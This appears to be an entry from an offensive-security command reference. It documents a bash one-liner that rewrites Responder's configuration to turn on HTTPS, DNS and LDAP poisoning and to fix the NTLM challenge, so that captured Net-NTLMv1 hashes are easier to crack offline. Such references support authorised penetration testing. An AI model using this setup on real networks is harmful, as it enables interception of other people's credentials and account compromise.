---
type: command
executor: bash
data: >-
  echo 'HTTPS = On\nDNS = On\nLDAP = On\n...\n; Custom challenge.\n; Use
  "Random" for generating a random challenge for each requests
  (Default)\nChallenge = 1122334455667788' > /etc/responder/Responder.conf
output: null
created_at: '2023-04-06T03:56:05.187810+00:00'
updated_at: '2023-04-10T20:35:59.633859+00:00'
platforms:
  - Linux
tags:
  - ntlm
  - poisoning
verified: true
validated: true
---

# responder-configure-custom-challenge

## Command

```bash
echo 'HTTPS = On\nDNS = On\nLDAP = On\n...\n; Custom challenge.\n; Use "Random" for generating a random challenge for each requests (Default)\nChallenge = 1122334455667788' > /etc/responder/Responder.conf
```

## Description

This command overwrites the Responder configuration file to enable key poisoning modules (HTTPS, DNS, LDAP) and sets a fixed NTLM challenge for consistent hash capture. Use before starting Responder to aid in offline cracking of captured Net-NTLMv1 hashes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Challenge = 1122334455667788 | Fixed hex challenge value for NTLM responses | Yes |
| HTTPS = On | Enable HTTPS poisoning | Yes |
| DNS = On | Enable DNS poisoning | Yes |
| LDAP = On | Enable LDAP poisoning | Yes |

## Examples

### Basic Usage

```bash
echo 'Challenge = 1122334455667788' >> /etc/responder/Responder.conf
```

### Full Config Overwrite

Use the main command for complete setup.

## Expected Output

File `/etc/responder/Responder.conf` updated with no syntax errors. Verify with `cat /etc/responder/Responder.conf` showing the challenge line.

## Related

- [[procedures/Capture-and-Crack-Net-NTLMv1-Hashes]]
- [[tools/Responder]]
